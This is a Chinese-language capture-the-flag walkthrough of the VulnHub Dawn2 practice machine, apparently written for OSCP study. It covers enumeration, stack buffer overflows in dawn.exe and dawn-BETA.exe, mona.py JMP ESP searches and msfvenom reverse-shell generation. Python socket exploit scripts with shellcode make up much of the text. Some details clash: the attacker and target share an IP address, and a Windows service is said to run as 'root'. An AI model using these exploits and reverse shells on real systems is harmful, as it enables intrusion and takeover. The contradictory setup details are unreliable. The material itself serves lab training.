---
title: VulnHub Dawn2 靶机完整渗透测试复现
description: VulnHub Dawn2 靶机完整渗透测试复现：Windows 缓冲区溢出利用（Immunity Debugger + mona.py
  JMP ESP）、msfvenom 生成反弹 Shell、Python Socket Exploit 编写，以及通过第二个以 root 运行的易受攻击服务实现权限提升的全链路实战。
category: program-analysis
tags:
- VulnHub
- Buffer Overflow
- Windows Exploitation
- Immunity Debugger
- mona.py
- JMP ESP
- msfvenom
- Reverse Shell
- Python Exploit
- Privilege Escalation
- OSCP
date: 2024-01-15
updated: '2026-11-14'
---
## 概述

本页面记录 **VulnHub Dawn2** 靶机的完整渗透测试复现过程。实战涵盖从服务枚举、二进制程序分析、Windows 栈缓冲区溢出漏洞挖掘与利用（Immunity Debugger + mona.py 定位 `JMP ESP`、msfvenom 生成反弹 Shell、Python Socket Exploit 编写），到通过第二个以 **root 权限运行**的易受攻击服务实现权限提升的全链路攻击链。适合 OSCP 风格实战练习与 Windows 二进制漏洞利用入门参考。

> 靶机下载：`https://download.vulnhub.com/sunset/dawn2.7z`  
> 难度：中等 | 部署环境：VirtualBox 桥接模式 | 靶机 IP：`192.168.31.174`

---

## 环境与工具链

| 角色 | 规格 |
|------|------|
| 攻击机 | Kali Linux (`192.168.31.111` / `192.168.31.174` 视阶段而定) |
| 靶机 | Windows (Dawn2) `192.168.31.174` |
| 调试器 | Immunity Debugger + **mona.py** |
| 漏洞利用开发 | Python 2 (`socket`)、msfvenom |
| 端口监听 | `nc -lvnp 8888` |

> **相关资源**：VulnHub 平台介绍与镜像合集见 [[vulnhub-platform-resource-index]]；同类 Windows 栈溢出实战可参考 [[windows-x86-stack-overflow-shellcode-execution]] 与 [[vulnhub-hard-socnet2-writeup]]。

---

## 信息收集与服务枚举

### 主机发现与全端口扫描

```bash
# 主机存活确认
nmap -sn 192.168.31.0/24

# 全端口扫描
nmap -p- -sS -T4 192.168.31.174
```

发现开放端口：**80 (HTTP)**、`1985` (dawn.exe)、`1435` (dawn-BETA.exe) 等。

### Web 服务 (80/TCP) 信息收集

访问 `http://192.168.31.174` 发现一个 **ZIP 压缩包** 下载链接，解压后得到可执行文件 `dawn.exe`。

> 该文件即为运行在靶机 **1985 端口** 的网络服务程序。

---

## 漏洞发现：dawn.exe 缓冲区溢出

### 动态调试环境搭建

1. 将 `dawn.exe` 复制至 Windows 调试环境  
2. 使用 **Immunity Debugger** 打开并运行 `dawn.exe`  
3. 确认程序在本地监听 `0.0.0.0:1985`

### Fuzzing 触发溢出

```python
# fuzz.py
import socket
payload = 'A' * 500 + '\x00'
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.31.111', 1985))  # 调试环境 IP
    s.send(payload.encode())
    s.close()
    print("payload send successfully")
except Exception as e:
    print(e)
print("error")
```

发送后观察 Immunity Debugger：**EIP 与 ESP 均被 `0x41` (`A`) 覆盖**，确认存在栈缓冲区溢出。

### 精确偏移计算

通过逐步调整长度，确定：

- **EIP 偏移**：**272 字节** 后覆盖 EIP (`BBBB` = `0x42424242`)  
- **ESP 指向**：EIP 后紧跟的数据 (`CCCC...`) 落在 ESP 指向的栈空间

```python
# offset_verify.py
payload = 'A' * 272 + 'BBBB' + 'CCCCCCCCCCCCCCCC' + '\x00'
```

---

## Exploit 开发：从溢出到代码执行

### 定位 JMP ESP 指针 (mona.py)

在 Immunity Debugger 安装目录 `PyCommands` 下放入 [mona.py](https://github.com/corelan/mona)，执行：

```
!mona jmp -r esp
```

输出可用地址（示例）：
```
0x345964ba
0x34581777   <-- 选用此地址 (小端序: \x77\x17\x58\x34)
```

> **原理**：覆盖 EIP 为 `JMP ESP` 地址，CPU 执行跳转后将执行 ESP 指向的 Shellcode。

### 生成反弹 Shell Shellcode (msfvenom)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.31.111 LPORT=8888 \
  -f python -b '\x00' -v buff
```

> 关键参数：`-b '\x00'` 剔除空字节，避免 `strcpy` 等函数截断；`-v buff` 直接输出 Python 变量赋值语句。

### 组装最终 Exploit (Python 2)

```python
#!/usr/bin/python
import socket

# msfvenom 生成的 shellcode 变量 buff
buff = (
    "\xda\xc4\xbd\x36\xcc\xf1\x3e\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
    "\x52\x31\x6e\x17\x83\xc6\x04\x03\x58\xdf\x13\xcb\x58\x37\x51"
    # ... (省略中间字节)
    "\x81\xa0"
)

# 构造 payload
# 272 字节填充 + JMP ESP 地址 (小端序) + NOP 滑板 + shellcode + 结尾 \x00
payload = "A" * 272 + "\x77\x17\x58\x34" + "\x90" * 32 + buff + "\x00"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.31.111', 1985))  # 调试环境 IP
    s.send(payload)
    s.close()
    print("payload send successfully")
except Exception as e:
    print(e)
print("error")
```

### 获取初始 Shell (Flag 1)

1. Kali 监听：`nc -lvnp 8888`  
2. 运行 Exploit：`python2 exploit_dawn.py`  
3. 成功反弹 `dawn-daemon` 用户 Shell  

```text
C:\Users\dawn-daemon>type flag1.txt
flag{...}
```

---

## 权限提升：dawn-BETA.exe (Root 服务溢出)

### 发现以 Root 运行的二进制服务

```cmd
C:\Users\dawn-daemon>dir
# 发现 dawn-BETA.exe，属主为 root (Administrator/System)

C:\Users\dawn-daemon>tasklist /v | findstr dawn-BETA
# 确认进程正在以 root 身份运行，监听 1435 端口
```

### 漏洞利用复用相同流程

1. 将 `dawn-BETA.exe` 拷贝至调试环境  
2. Immunity Debugger + mona.py 重新分析偏移与 `JMP ESP`  
   - 新偏移：**13 字节** 覆盖 EIP  
   - 新 `JMP ESP` 地址：`0x52501513` (小端序 `\x13\x15\x50\x52`)  
3. 重新生成 Shellcode (LHOST 指向靶机网段 `192.168.31.174` 可达的攻击机 IP)  
4. 编写提权 Exploit

```python
#!/usr/bin/python
import socket

buff = (
    "\xdd\xc0\xd9\x74\x24\xf4\x58\x2b\xc9\xbb\xca\x52\x3b\x9d\xb1"
    "\x12\x31\x58\x17\x03\x58\x17\x83\x22\xae\xd9\x68\x83\x94\xe9"
    # ... (省略)
    "\x41\x79\x11\xcd\x02"
)

payload = "A" * 13 + "\x13\x15\x50\x52" + "\x90" * 32 + buff + "\x00"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.31.174', 1435))  # 靶机 IP + root 服务端口
    s.send(payload)
    s.close()
    print("payload send successfully")
except Exception as e:
    print(e)
print("error")
```

### 获取 Root Shell (Flag 2)

1. Kali 监听 8888 端口  
2. 运行提权 Exploit  
3. 反弹 **SYSTEM/Administrator** 权限 Shell  

```text
C:\Windows\system32>type flag2.txt
flag{...}
```

---

## 关键技术点总结

| 阶段 | 核心技术 | 关键工具/命令 |
|------|----------|---------------|
| 漏洞触发 | 栈缓冲区溢出 (strcpy/recv 类无长度检查) | Python `socket` Fuzzing |
| 偏移定位 | 循环模式/手动二分法确定 EIP/ESP 偏移 | Immunity Debugger 观察寄存器 |
| 控制流劫持 | **JMP ESP** 返跳执行栈上 Shellcode | `!mona jmp -r esp` |
| 坏字符处理 | 剔除 `\x00` 等截断字符 | `msfvenom -b '\x00'` |
| Shellcode 生成 | Windows 反弹 TCP Shell | `msfvenom -p windows/shell_reverse_tcp` |
| Exploit 编写 | Python 2 Socket 发送原始载荷 | 手工拼接填充 + JMP ESP + NOP + Shellcode |
| 权限提升 | 利用同漏洞类型的高权限服务 | 复用上述全流程，仅修改偏移/地址/端口 |

---

## 交叉引用与延伸阅读

- **VulnHub 实战系列**：[[vulnhub-platform-resource-index]]、[[vulnhub-hard-socnet2-writeup]]、[[vulnhub-bbs-cute-102-writeup]]、[[vulnhub-infosecprep-oscp-writeup]]  
- **Windows 栈溢出基础**：[[windows-x86-stack-overflow-shellcode-execution]] (PEB 遍历导出表、Shellcode 编码绕过)  
- **Linux 栈溢出与 ROP 对比学习**：[[peda-buffer-overflow-analysis-guide]]、[[rop-linux-x86-beginner-tutorial]]  
- **调试器技巧迁移**：Immunity Debugger + mona.py 思路可类比 GDB + PEDA / x64dbg 场景  

---

## 复现检查清单 (Checklist)

- [ ] 靶机部署与网络互通验证  
- [ ] 80 端口下载并提取 `dawn.exe` / `dawn-BETA.exe`  
- [ ] Immunity Debugger + mona.py 环境就绪  
- [ ] Fuzzing 确认溢出、手工/脚本精确定位 EIP/ESP 偏移  
- [ ] `!mona jmp -r esp` 搜索可用 `JMP ESP` 地址 (需无 ASLR/Rebase 模块)  
- [ ] `msfvenom` 生成无 `\x00` 反弹 Shellcode  
- [ ] Python 2 Exploit 编写、本地调试验证 EIP 控制与 Shellcode 着陆  
- [ ] 攻击靶机 1985 端口获取 `dawn-daemon` Shell → 读取 Flag1  
- [ ] 枚举提权面：发现 `dawn-BETA.exe` 以 Root 运行、监听 1435  
- [ ] 复用完整流程针对 1435 端口开发提权 Exploit  
- [ ] 攻击获取 SYSTEM Shell → 读取 Flag2  

---

> **提示**：实战中若遭遇 DEP/ASLR/CFG 等缓解措施，需进一步引入 ROP 链绕过（如 `VirtualProtect`/`VirtualAlloc` 修改内存属性）、信息泄露绕过 ASLR 等技术；本靶机为练习环境，**未开启现代缓解**，适合基础流程肌肉记忆训练。  
> 更多高级二进制利用技巧可关注 [[binary-ninja-ollvm-deobfuscation]]、[[phantom-dll-hollowing-technique]] 等页面。

## 来源

- [0x00实验室-202108-202304_023](../sources/0x00实验室-202108-202304_023.md)
